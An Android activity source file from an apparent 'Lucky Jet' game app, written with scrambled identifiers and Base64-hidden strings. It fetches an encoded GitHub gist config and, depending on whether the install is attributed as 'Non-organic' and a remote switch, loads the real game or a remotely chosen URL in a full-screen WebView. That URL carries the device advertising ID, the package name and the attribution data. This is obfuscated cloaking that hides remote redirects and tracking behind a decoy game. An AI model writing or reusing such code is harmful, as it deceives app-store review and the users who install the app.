package com.luucckkyy.jjeett.ertyfv.jsl;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.webkit.ValueCallback;
import android.webkit.WebView;
import android.widget.Button;
import android.widget.ProgressBar;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;

import com.facebook.FacebookSdk;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.luucckkyy.jjeett.ertyfv.MainActivity;
import com.luucckkyy.jjeett.ertyfv.R;
import com.luucckkyy.jjeett.ertyfv.SetImg1;
import com.luucckkyy.jjeett.ertyfv.SetText;
import com.onesignal.OneSignal;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;


public class LJ extends Activity {


    WebView kdsf;

    public static ValueCallback<Uri> kdsdsd;
    public static Uri ldsjds = null;
    public static ValueCallback<Uri[]> jdssd;
    public static String lfjwo;
    public static final int kdfosd = 1;
    private Button lfsjd, lfdjfs;
    private ProgressBar lfndie;
    public static String kfsf;
    public static String kdffjfds;
    public static String kdfs;
    public static String ldjwesd;
    String aewkds = null;


    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().addFlags(1024);
        setContentView(R.layout.lj);;
        kdsf = findViewById(R.id.web);
        lfsjd = findViewById(R.id.startGame);
        lfdjfs = findViewById(R.id.privacyPolicy);
        lfndie = findViewById(R.id.progressBar);
        Kij.lj = this;
        YUT.lj = this;
        hfk();


    }

    @Override
    public void onBackPressed() {
        if (kdsf.isFocused() && kdsf.canGoBack()) {
            kdsf.goBack();
        }
    }
    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode != kdfosd || jdssd == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        Uri[] results = null;
        if (resultCode == Activity.RESULT_OK) {
            if (data == null) {
                if (lfjwo != null) {
                    results = new Uri[]{Uri.parse(lfjwo)};
                }
            } else {
                String dataString = data.getDataString();
                if (dataString != null) {
                    results = new Uri[]{Uri.parse(dataString)};
                }
            }
        }
        jdssd.onReceiveValue(results);
        jdssd = null;
        if (kdsdsd == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }

        Uri result = null;
        try {
            if (resultCode != RESULT_OK) {
                result = null;
            } else {
                result = data == null ? ldsjds : data.getData();
            }
        } catch (Exception e) { }
        kdsdsd.onReceiveValue(result);
        kdsdsd = null;

    }

    public void hfk(){

        if (SetImg1.ifd(this) == 0){

              connn();

        }else {
            lfsjd.setVisibility(View.VISIBLE);
            lfdjfs.setVisibility(View.VISIBLE);
            lfndie.setVisibility(View.INVISIBLE);
            lfsjd.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View view) {
                    startActivity(new Intent(LJ.this, MainActivity.class));
                    finishAffinity();
                }
            });
            lfdjfs.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View view) {
                  startActivity(new Intent(LJ.this, WEX.class));
                }
            });
        }
    }


    private void connn(){

        new Thread(new Runnable() {
            @RequiresApi(api = Build.VERSION_CODES.O)
            @Override
            public void run() {
                try {

                    HttpURLConnection llo = (HttpURLConnection) new URL(SetText.kkkk("aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9BcnR1cjIyNDQxOTkzL2FmNzRmNWVjYWFmNjgxNjk0OTc1MGIwNmFlYTVhNjI1L3Jhdy9MdWNreV9KZXQ=")).openConnection();
                    BufferedReader ews = new BufferedReader(new InputStreamReader(llo.getInputStream()));
                    String loj = ews.readLine();
                    String [] d = loj.split("\\\u007C");
                    kdffjfds = d[0];
                    kdfs = d[1];
                    kfsf = d[2];

                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            FacebookSdk.setApplicationId(kfsf);
                            FacebookSdk.setAdvertiserIDCollectionEnabled(true);
                            FacebookSdk.sdkInitialize(getApplicationContext());
                            FacebookSdk.fullyInitialize();
                            FacebookSdk.setAutoInitEnabled(true);
                            FacebookSdk.setAutoLogAppEventsEnabled(true);
                            Dippp.diiipp(LJ.this);


                            aewkds = getSharedPreferences(getPackageName(), MODE_PRIVATE).getString(SetText.kkkk("c2F2ZWRVcmw="), "null");

                            if (aewkds.equals("null")){

                                new Handler().postDelayed(new Runnable() {
                                    @Override
                                    public void run() {
                                        kdsf.setVisibility(View.VISIBLE);

                                        String kfujd = Apapap.khfsb;
                                        String lifdf = null;
                                        if (kfujd.equals(SetText.kkkk("Tm9uLW9yZ2FuaWM="))){
                                            lifdf = kdffjfds + Apapap.kiyh;
                                            kdsf.loadUrl(lifdf);
                                        }else if(Dippp.kigj != null) {
                                            lifdf = kdffjfds + Dippp.kihf;
                                            kdsf.loadUrl(lifdf);
                                        }else {
                                            if (kdfs.equals(SetText.kkkk("Tk8="))) {
                                                startActivity(new Intent(getApplicationContext(), MainActivity.class));
                                                finishAffinity();
                                            }else {
                                                String fs = kdfs + SetText.kkkk("P2J1bmRsZT0=") + getPackageName() + SetText.kkkk("JmFkX2lkPQ==") + ldjwesd + SetText.kkkk("JmFwcHNfaWQ9") + Apapap.kgch;
                                                lifdf = kdffjfds + fs;
                                                kdsf.loadUrl(lifdf);
                                            }
                                        }
                                    }
                                },5000);
                            }else {
                                kdsf.setVisibility(View.VISIBLE);
                                kdsf.loadUrl(aewkds);
                            }

                        }
                    });

                }catch (Exception e){
                    startActivity(new Intent(LJ.this,MainActivity.class));
                    finishAffinity();
                }

            }
        }).start();

    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    public static void onne(Apapap apapap){
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
        OneSignal.initWithContext(apapap.getApplicationContext());
        OneSignal.setAppId(SetText.kkkk("YTU0YWIyYTctYmFlZi00YTBiLTgxYjUtMjhjMjEyOWI1Mjgw"));
    }

    public static void aaaiid(Apapap apapap){

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    ldjwesd = AdvertisingIdClient.getAdvertisingIdInfo(apapap.getApplicationContext()).getId();
                }catch (Exception e){
                }
            }
        }).start();
    }

}
